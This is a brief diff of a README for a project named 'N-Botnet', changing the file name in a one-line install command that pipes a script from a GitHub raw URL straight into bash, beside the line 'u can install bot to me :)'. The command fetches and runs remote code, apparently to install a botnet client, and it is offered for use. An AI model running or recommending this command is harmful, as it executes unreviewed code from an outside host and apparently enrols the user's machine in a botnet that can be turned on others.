@@ -20,7 +20,7 @@ bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/ma
 
 u can install bot to me :)
 ```bash
-bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/N-Botnet.sh)
+bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)
 ```
 
 ## Contributors ✨
